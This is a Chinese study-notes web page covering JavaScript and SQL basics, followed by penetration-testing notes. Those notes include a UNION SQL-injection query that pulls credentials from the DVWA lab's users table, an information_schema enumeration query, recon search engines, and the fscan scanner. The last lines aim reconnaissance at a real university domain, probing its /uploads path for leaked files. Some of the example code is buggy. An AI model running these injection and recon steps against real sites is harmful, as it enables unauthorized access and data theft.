<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>JS 基础</title>
    <meta name="generator" content="VuePress 1.9.9">
    
    <meta name="description" content="">
    
    <link rel="preload" href="/Hrgee/assets/css/0.styles.4f4d51f6.css" as="style"><link rel="preload" href="/Hrgee/assets/js/app.27d78a7b.js" as="script"><link rel="preload" href="/Hrgee/assets/js/2.733019b2.js" as="script"><link rel="preload" href="/Hrgee/assets/js/14.4e4b238e.js" as="script"><link rel="prefetch" href="/Hrgee/assets/js/10.7ccebb7c.js"><link rel="prefetch" href="/Hrgee/assets/js/11.33dcb92d.js"><link rel="prefetch" href="/Hrgee/assets/js/12.f1df6114.js"><link rel="prefetch" href="/Hrgee/assets/js/13.b59e04d3.js"><link rel="prefetch" href="/Hrgee/assets/js/15.425f24f3.js"><link rel="prefetch" href="/Hrgee/assets/js/16.c0040550.js"><link rel="prefetch" href="/Hrgee/assets/js/17.f2889cf9.js"><link rel="prefetch" href="/Hrgee/assets/js/18.b9dae3fb.js"><link rel="prefetch" href="/Hrgee/assets/js/19.f9ffe888.js"><link rel="prefetch" href="/Hrgee/assets/js/20.6803e588.js"><link rel="prefetch" href="/Hrgee/assets/js/21.3dd21fa9.js"><link rel="prefetch" href="/Hrgee/assets/js/22.9da5fa5c.js"><link rel="prefetch" href="/Hrgee/assets/js/3.d9b695e0.js"><link rel="prefetch" href="/Hrgee/assets/js/4.d12742be.js"><link rel="prefetch" href="/Hrgee/assets/js/5.216cae74.js"><link rel="prefetch" href="/Hrgee/assets/js/6.2d0a63f8.js"><link rel="prefetch" href="/Hrgee/assets/js/7.9c9172a7.js"><link rel="prefetch" href="/Hrgee/assets/js/8.9031bae3.js"><link rel="prefetch" href="/Hrgee/assets/js/9.26d3d10e.js">
    <link rel="stylesheet" href="/Hrgee/assets/css/0.styles.4f4d51f6.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/Hrgee/" class="home-link router-link-active"></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/Hrgee/" class="nav-link">
  首页
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Ling blog" class="dropdown-title"><span class="title">Ling blog</span> <span class="arrow down"></span></button> <button type="button" aria-label="Ling blog" class="mobile-dropdown-title"><span class="title">Ling blog</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://github.com/Hgrre/Hrgee.git" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Github
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/Hrgee/" class="nav-link">
  首页
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Ling blog" class="dropdown-title"><span class="title">Ling blog</span> <span class="arrow down"></span></button> <button type="button" aria-label="Ling blog" class="mobile-dropdown-title"><span class="title">Ling blog</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://github.com/Hgrre/Hrgee.git" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Github
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><a href="/Hrgee/" class="sidebar-heading clickable router-link-active open"><span>欢迎学习</span> <!----></a> <ul class="sidebar-links sidebar-group-items"><li><a href="/Hrgee/" aria-current="page" class="sidebar-link">博客介绍</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/Hrgee/handbook/图片隐写" class="sidebar-heading clickable"><span>CTF-WP</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/Hrgee/handbook/Python笔记" class="sidebar-heading clickable"><span>Python基础</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/Hrgee/handbook/Linux笔记" class="sidebar-heading clickable"><span>Linux基础</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/Hrgee/handbook/sql" class="sidebar-heading clickable"><span>渗透</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/Hrgee/handbook/C笔记" class="sidebar-heading clickable"><span>逆向</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/Hrgee/handbook/NA" class="sidebar-heading clickable"><span>网络通讯基础</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/Hrgee/handbook/windows" class="sidebar-heading clickable"><span>操作系统</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/Hrgee/handbook/JS" class="sidebar-heading clickable"><span>Web渗透</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/Hrgee/handbook/web" class="sidebar-heading clickable"><span>Web</span> <span class="arrow right"></span></a> <!----></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h2 id="js-基础"><a href="#js-基础" class="header-anchor">#</a> JS 基础</h2> <h4 id="js是一门弱类型语言-解释性的语言-它是可以直接被浏览器所解释的-它不需要像c语言一样-声明它的类型。"><a href="#js是一门弱类型语言-解释性的语言-它是可以直接被浏览器所解释的-它不需要像c语言一样-声明它的类型。" class="header-anchor">#</a> JS是一门弱类型语言，解释性的语言，它是可以直接被浏览器所解释的，它不需要像C语言一样，声明它的类型。</h4> <h2 id="变量"><a href="#变量" class="header-anchor">#</a> 变量</h2> <ul><li><strong>&lt;input type= &quot;button”  onclick=&quot;alert('按钮') &quot;   value=&quot; 按钮&quot;&gt;    按钮button ， on cilck  是被单击的意思</strong></li> <li><strong>外链式</strong></li></ul> <div class="language- extra-class"><pre class="language-text"><code>//声明变量
var num;		//声明一个名称为 num 的变量，此时的值为  Undefined（未被定义的）
num=10;			//给 num 赋值 
num=&quot;123&quot;;		//给 num 赋予字符串的值
num=true;		//给 num 赋予布尔的值
num=null;		//给 num 赋值为 null
//声明变量并赋值，称为变量初始化
var num=10;

console.log(num) 		//打印
</code></pre></div><h2 id="类型转换"><a href="#类型转换" class="header-anchor">#</a> 类型转换</h2> <div class="language- extra-class"><pre class="language-text"><code> var num=10;
 num.toString()					//将 num 作为转为String类型
 String(num)					//将 num 转为String类型
 
 parsInt(String)				//String类型转int
 parseFloat(String)				//转float
</code></pre></div><h2 id="运算符"><a href="#运算符" class="header-anchor">#</a> 运算符</h2> <h4 id="表达式-由数字、运算符和变量组成的式子"><a href="#表达式-由数字、运算符和变量组成的式子" class="header-anchor">#</a> 表达式：由数字、运算符和变量组成的式子</h4> <h4 id="返回值-每个表达式经过运算后都有相应的返回值"><a href="#返回值-每个表达式经过运算后都有相应的返回值" class="header-anchor">#</a> 返回值：每个表达式经过运算后都有相应的返回值</h4> <h2 id="算术运算-符"><a href="#算术运算-符" class="header-anchor">#</a> 算术运算 符</h2> <h4 id="算术表达式的返回值都是数值型"><a href="#算术表达式的返回值都是数值型" class="header-anchor">#</a> 算术表达式的返回值都是数值型</h4> <div class="language- extra-class"><pre class="language-text"><code>var a=10,b=10,c;
c=a+b;			//加法运算符
c=a-b;			//减法
c=a/b;			//除法
c=a*b;			//乘法
c=a%b;			//取余数
</code></pre></div><h2 id="逻辑运算符"><a href="#逻辑运算符" class="header-anchor">#</a> 逻辑运算符</h2> <h4 id="逻辑表达式的返回值都是布尔型"><a href="#逻辑表达式的返回值都是布尔型" class="header-anchor">#</a> 逻辑表达式的返回值都是布尔型</h4> <div class="language- extra-class"><pre class="language-text"><code>//与运算(&amp;&amp;) 有false即false
true &amp;&amp; true			//返回值为true
true &amp;&amp; false			//返回值为false	

//或运算(||) 有true即 true
true || true			//返回值为true
true || true			//返回值为true

//非运算，取反
!true 				//返回值为false
</code></pre></div><h2 id="流程控制"><a href="#流程控制" class="header-anchor">#</a> 流程控制</h2> <h4 id="if-语句-可以说是如果-它会将所返回的一个值进行一个判断"><a href="#if-语句-可以说是如果-它会将所返回的一个值进行一个判断" class="header-anchor">#</a> if  语句：可以说是如果，它会将所返回的一个值进行一个判断</h4> <div class="language- extra-class"><pre class="language-text"><code>//  1.  条件成立执行的代码语句
	if (条件表达式) {
	}
	
//  2. if else 语句
	if (条件表达式) {			//如果条件成立执行的代码
	} else {
	
// 否则执行的代码
	}

//  3. if else if 语句 （多分支语句） 
//  适合检查多重条件
	if (条件表达式1) {
		语句1;
	} else if（条件表达式2） {
		语句2;
	} else if（条件表达式3） {
		语句3;
	} else {
// 上述条件都不成立执行此处代码
	}                                               
//三目运算符 ：？ true ： false  
if (true || false) { alert(&quot;我爱潘艺华，潘艺华是我的大宝贝&quot;)}  ben'di
</code></pre></div><h4 id="switch-语句"><a href="#switch-语句" class="header-anchor">#</a> switch 语句 ：</h4> <div class="language- extra-class"><pre class="language-text"><code>switch (表达式) {
	case value1:
	// 表达式 等于 value1 时要执行的代码
		break;
	case value2:
	// 表达式 等于value2 时要执行的代码
		break;
	//如果没有break 就会全部执行，因为它没有跳出这个函数
	default:
	// 表达式 不等于任何一个 value 时要执行的代码
}
	//如果上面的cash 都找不到就直接执行default
</code></pre></div><h4 id="for-循环"><a href="#for-循环" class="header-anchor">#</a> for 循环 :</h4> <div class="language- extra-class"><pre class="language-text"><code>for(初始化变量； 条件表达式； 操作表达式){
	//循环体代码
}

如：
for(var i=0 ; i &lt; 10 ; i++){
	console.log(i);
}
</code></pre></div><h4 id="while-循环"><a href="#while-循环" class="header-anchor">#</a> while 循环 ：</h4> <div class="language- extra-class"><pre class="language-text"><code>while (条件表达式){
	//循环体代码
}

如：
var i = 0
while(i &lt; 100 ){
	console.log(i);
	i++;
}
	//加i++ 是为了跳出这个100的循环
</code></pre></div><h4 id="九九乘法-for-循环"><a href="#九九乘法-for-循环" class="header-anchor">#</a> 九九乘法 (for 循环)</h4> <div class="language- extra-class"><pre class="language-text"><code>var str = &quot;&quot;;
  for (var i =1; i &lt;= 9; i++) {
  	for (var j= 1; j &lt;=1; j++) {
  		str += j + &quot;x&quot; + i + &quot;=&quot; + j * i + &quot;\t&quot;;
  	}
  	str += &quot;\n&quot;;
  }
  console.log(str);
</code></pre></div><h4 id="_1-100-累加和-while"><a href="#_1-100-累加和-while" class="header-anchor">#</a> 1-100 累加和（while）:</h4> <div class="language- extra-class"><pre class="language-text"><code>//计算 1-100 的累加和：
	var i =1;
	var sum =0;
	while(i &lt;= 100) {
		sum += i;
		i++;
	}
	console.log(sum);
</code></pre></div><h2 id="函数"><a href="#函数" class="header-anchor">#</a> 函数</h2> <h4 id="函数就是将我们这一块代码进行一个封装-封装好后方便我们去调用。"><a href="#函数就是将我们这一块代码进行一个封装-封装好后方便我们去调用。" class="header-anchor">#</a> 函数就是将我们这一块代码进行一个封装，封装好后方便我们去调用。</h4> <div class="language- extra-class"><pre class="language-text"><code>1 . 通过function 关键字来定义函数 -- 命名为函数
	function 函数名() {
	//函数体代码
	}
如：
function print_(){
	console.log('123')
}
print_()

2 . 通过函数表达式来定义函数  --匿名函数
	var fn = function() {
	}
	
3 . 调用函数
	函数名();  		//需要先声明函数，才可调用
	变量名();			//调用存储在变量中的匿名函数
	
4 . 函数的参数
	//带参数的函数声明
	function 函数名(形参1，形参2，形参3···) {
	//函数体  
	}
	//带参数的函数调用
	函数名(实参1，实参2，实参3···);
	function login(username,password){
	} 
如：
	function login(username,password){
		if(uesrname='123' &amp;&amp; password='123'){
			alert(&quot;登陆成功&quot;);
		}
	}
	login('123','123');
	 
传参 比如：
function print_(str){
	console.log(str)
}
print_(&quot;你好，web安全&quot;)

5 . 多个参数
//如果函数调用的参数太多（超过声明），则可以使用 arguments 对象来达到这些参数。
	x = sumAll(1, 123, 500, 115, 44, 88);
	function sumAll() {
		var i, sum = 0;
		for (i = 0; i &lt; arguments.length; i++) {
			sum += arguments[i];
		}
		return sum;
}
</code></pre></div><h2 id="数组"><a href="#数组" class="header-anchor">#</a> 数组</h2> <div class="language- extra-class"><pre class="language-text"><code>//定义数组
var arrStus = [1,2,'123'];

//获取数组中的第二个元素

alert(arrStus[1]);

//如果访问数组时没有和索引值对应的元素(数组越界)，
//返回值为undefined
</code></pre></div><h2 id="dom"><a href="#dom" class="header-anchor">#</a> DOM</h2> <h4 id="js-可以动态的更改html"><a href="#js-可以动态的更改html" class="header-anchor">#</a> JS 可以动态的更改HTML</h4> <h4 id="更改html标签内容"><a href="#更改html标签内容" class="header-anchor">#</a> 更改HTML标签内容</h4> <div class="language- extra-class"><pre class="language-text"><code>&lt;html&gt;
&lt;body&gt;
	&lt;p id=&quot;p1&quot;&gt;Hello world!&lt;/p&gt;
	&lt;script&gt;
		document.getElementById(&quot;p1&quot;).innerHTML=&quot;New text!&quot;;
	&lt;/script&gt;
	&lt;p&gt;上面的段落被一条 Javascript 脚本修改了。&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div><h4 id="更改html标签属性"><a href="#更改html标签属性" class="header-anchor">#</a> 更改HTML标签属性</h4> <div class="language- extra-class"><pre class="language-text"><code>&lt;html&gt;
&lt;body&gt;
	&lt;p id=&quot;p1&quot;&gt;Hello world!&lt;/p&gt;
	&lt;script&gt;
		document.getElementById(&quot;p1&quot;)。id=&quot;p2&quot;;
		x=document.getElementById(&quot;p2&quot;).id;
		document.write(x)
	&lt;/script&gt;
	&lt;p&gt;上面的段落被一条 Javascript 脚本修改了。&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div><h2 id="事件"><a href="#事件" class="header-anchor">#</a> 事件</h2> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918102906985.webp" alt="image-20230918102906985"></p> <h2 id="表单校验"><a href="#表单校验" class="header-anchor">#</a> 表单校验</h2> <h4 id="javascript-可用来在数据被送往服务器前对-html-表单中的这些输入数据进行验证。"><a href="#javascript-可用来在数据被送往服务器前对-html-表单中的这些输入数据进行验证。" class="header-anchor">#</a> JavaScript 可用来在数据被送往服务器前对 HTML 表单中的这些输入数据进行验证。</h4> <h4 id="表单数据经常需要使用-javascript-来验证其正确性"><a href="#表单数据经常需要使用-javascript-来验证其正确性" class="header-anchor">#</a> 表单数据经常需要使用 JavaScript 来验证其正确性：</h4> <ul><li><strong>验证表单数据是否为空？</strong></li> <li><strong>验证输入是否是一个正确的email地址？</strong></li> <li><strong>验证日期是否输入正确？</strong></li> <li><strong>验证表单输入内容是否为数字型？</strong></li></ul> <div class="language- extra-class"><pre class="language-text"><code>&lt;form METHOD=POST ACTION=&quot;&quot;&gt;
	&lt;input type=&quot;password&quot; id=&quot;input1&quot;&gt;
	&lt;input type=&quot;password&quot; id=&quot;input2&quot;&gt;
	&lt;input type=&quot;button&quot; value=&quot;test&quot; onclick=&quot;check()&quot;&gt;
&lt;/form&gt;
&lt;script&gt;
	function check() {
	if(document.getElementById(&quot;input1&quot;).value/=document.getElementById(&quot;input2&quot;).value)
{
	alert(&quot;两次密码不一样&quot;)
	input1.value = &quot;&quot;;
	input2.value = &quot;&quot;;
}
	else document.forms[0].submit();
}
&lt;/script&gt;    
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div><h4 id="校验"><a href="#校验" class="header-anchor">#</a> 校验</h4> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918103627169.webp" alt="image-20230918103627169"></p> <h2 id="jquery"><a href="#jquery" class="header-anchor">#</a> JQuery</h2> <ul><li><strong>jQuery 是一个js库</strong></li> <li><strong>jQuery 极大的简化了js编程</strong></li> <li><strong>jQuery 很容易学习</strong></li></ul> <h2 id="导入-jquery-包"><a href="#导入-jquery-包" class="header-anchor">#</a> 导入 JQuery 包</h2> <div class="language- extra-class"><pre class="language-text"><code>&lt;script src-&quot;jquery.js&quot;&gt;&lt;/script&gt;
</code></pre></div><h2 id="jquery-ajax"><a href="#jquery-ajax" class="header-anchor">#</a> JQuery-ajax</h2> <h4 id="ajax-请求接口-返回-json-消息"><a href="#ajax-请求接口-返回-json-消息" class="header-anchor">#</a> ajax 请求接口，返回 json 消息</h4> <h4 id="响应消息的编码也必须是json-编码的才可以-content-type-text-json"><a href="#响应消息的编码也必须是json-编码的才可以-content-type-text-json" class="header-anchor">#</a> 响应消息的编码也必须是json 编码的才可以 （Content-type：text/json）</h4> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918113131522.webp" alt="image-20230918113131522"></p> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918151303135.webp" alt="image-20230918151303135"></p> <h2 id="json"><a href="#json" class="header-anchor">#</a> JSON</h2> <h4 id="json-javascriptobject-notation-对象表示法"><a href="#json-javascriptobject-notation-对象表示法" class="header-anchor">#</a> JSON ：JavaScriptObject Notation （对象表示法）</h4> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918152139878.webp" alt="image-20230918152139878"></p> <div class="language- extra-class"><pre class="language-text"><code>var json_1 = {&quot;name&quot;:&quot;taoeyhuang&quot;,&quot;age&quot;:18};
# 键值对  
</code></pre></div><h2 id="数据库"><a href="#数据库" class="header-anchor">#</a> 数据库</h2> <h4 id="创建数据表"><a href="#创建数据表" class="header-anchor">#</a> 创建数据表</h4> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918171257847.webp" alt="image-20230918171257847"></p> <h4 id="增加或插入数据"><a href="#增加或插入数据" class="header-anchor">#</a> 增加或插入数据：</h4> <ul><li><strong>insert  into  表名（字段名，字段名） values（值）；</strong></li> <li><strong>insert  into  表名  values（值，值）；</strong></li></ul> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918171532780.webp" alt="image-20230918171532780"></p> <h4 id="查询数据"><a href="#查询数据" class="header-anchor">#</a> 查询数据</h4> <ul><li><strong>select *  from 表名</strong></li> <li><strong>select  id from 表名</strong></li></ul> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918172311210.webp" alt="image-20230918172311210"></p> <h4 id="条件语句查询"><a href="#条件语句查询" class="header-anchor">#</a> 条件语句查询</h4> <ul><li><strong>select  *  from  表名 where id=10；</strong></li> <li><strong>select  *  from 表名  where  id=10  and  name='小明'；</strong></li></ul> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918172507087.webp" alt="image-20230918172507087"></p> <h4 id="修改语句"><a href="#修改语句" class="header-anchor">#</a> 修改语句</h4> <ul><li><strong>update   表名 set  字段=值， 字段=值  where 条件</strong></li> <li><strong>update  user set  name='小明', sex='男'  where id = 4；</strong></li></ul> <h4 id=""><a href="#" class="header-anchor">#</a> <img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918174038933.webp" alt="image-20230918174038933"></h4> <h4 id="删除数据"><a href="#删除数据" class="header-anchor">#</a> 删除数据</h4> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918174637188.webp" alt=""></p> <ul><li><strong>delete  from 表名  where  条件</strong></li> <li><strong>delete  from user  where  id=4；</strong></li></ul> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918174637188.webp" alt="image-20230918174637188"></p> <h4 id="对查询结果排序-ordey-by"><a href="#对查询结果排序-ordey-by" class="header-anchor">#</a> 对查询结果排序（ordey  by）</h4> <ul><li><strong>select  *   from  stu order  by  stu_id   字段</strong></li></ul> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918223946384.webp" alt="image-20230918223946384"></p> <h4 id="对查询结果分组"><a href="#对查询结果分组" class="header-anchor">#</a> 对查询结果分组</h4> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918224458134.webp" alt="image-20230918224458134"></p> <h4 id="限制查询数量"><a href="#限制查询数量" class="header-anchor">#</a> 限制查询数量</h4> <ul><li><strong>select  *  from  stu  limit 3  （只回显前三条数据）</strong></li></ul> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918224714735.webp" alt="image-20230918224714735"></p> <ul><li><strong>select  *  from  stu  limit  2， 5（从第三条数据开始检索出5条数据）</strong></li></ul> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918224950052.webp" alt="image-20230918224950052"></p> <h4 id="条件查询过滤"><a href="#条件查询过滤" class="header-anchor">#</a> 条件查询过滤</h4> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918225247875.webp" alt="image-20230918225247875"></p> <ul><li><strong>select *  from stu  where id in (8,2,5,4)   后面的字段随便写</strong></li></ul> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918225326780.webp" alt="image-20230918225326780"></p> <h4 id="模糊查询"><a href="#模糊查询" class="header-anchor">#</a> 模糊查询</h4> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918225708345.webp" alt="image-20230918225708345"></p> <h2 id="联合查询"><a href="#联合查询" class="header-anchor">#</a> 联合查询</h2> <ul><li><strong>union 操作符： 就是说可以在前面这个查询的一个基础上 加上select拼接起来联合查询</strong></li> <li><strong>联合查询是要通过 order by 去判断它的一个字段是多少个，然后后面加上select 它的一个查询字段</strong></li> <li><strong>select  * from stu union select</strong></li> <li><strong>联合查询有两个限制：① 两个查询的字段数量必须是一样的 ② 编码类型必须是一样的（编码不一样是不可以查询的）</strong></li> <li><strong>编码类型有两种 ①utf-8  ② gbk</strong></li></ul> <p><img src="https://rtyu-1317440738.cos.ap-guangzhou.myqcloud.com/image-20230918225836277.webp" alt="image-20230918225836277"></p> <div class="language- extra-class"><pre class="language-text"><code>select * from stu  union select user_id,user,password,4 from dvwa.users (库名加表名)
</code></pre></div><ul><li><strong>information_scheama 系统自带的数据库 （每一个mysql数据库里面都会 有这个系统数据库 mysql5版本以上才有的）</strong></li> <li><strong>数据库</strong></li> <li><strong>表名</strong></li> <li><strong>字段名</strong></li></ul> <div class="language- extra-class"><pre class="language-text"><code>select column_name from information_schema.columns where table_schema = 'dvwa' and table_name ='users'
</code></pre></div><h2 id="网络空间"><a href="#网络空间" class="header-anchor">#</a> 网络空间</h2> <h3 id="fofa"><a href="#fofa" class="header-anchor">#</a> FOFA</h3> <ul><li><strong>URL   : <a href="https://fofa.info/" target="_blank" rel="noopener noreferrer">fofa<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></strong></li></ul> <h3 id="鹰图"><a href="#鹰图" class="header-anchor">#</a> 鹰图</h3> <ul><li><strong>URL   :  <a href="https://hunter.qianxin.com/" target="_blank" rel="noopener noreferrer">鹰图平台 <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></strong></li></ul> <h2 id="网站信息"><a href="#网站信息" class="header-anchor">#</a> 网站信息</h2> <h3 id="ip地址归属"><a href="#ip地址归属" class="header-anchor">#</a> IP地址归属</h3> <ul><li><strong>URL ：<a href="http://www.cip.cc/" target="_blank" rel="noopener noreferrer">IP查询 <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></strong></li></ul> <h2 id="fscan"><a href="#fscan" class="header-anchor">#</a> fscan</h2> <p><strong>URL  : <a href="https://github.com/shadow1ng/fscan" target="_blank" rel="noopener noreferrer">fscan<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></strong></p> <ul><li><strong>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。</strong></li></ul> <h2 id="搜索资源的命令"><a href="#搜索资源的命令" class="header-anchor">#</a> 搜索资源的命令</h2> <div class="language-php extra-class"><pre class="language-php"><code>domain<span class="token operator">=</span><span class="token string double-quoted-string">&quot;xmist.edu.cn&quot;</span>
</code></pre></div><p><strong><code>body</code>:在它的一个网页代码里面有包含哪些内容</strong></p> <p><strong>如：</strong></p> <div class="language-php extra-class"><pre class="language-php"><code>body<span class="token operator">=</span><span class="token string double-quoted-string">&quot;/en/student/apply/index&quot;</span>
</code></pre></div><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="header-anchor">#</a> 敏感信息泄露</h2> <p><strong>在 <code>url</code>后添加一个<code>uploads</code></strong></p> <div class="language-php+HTML extra-class"><pre class="language-text"><code>https://www.xmist.edu.cn/uploads/
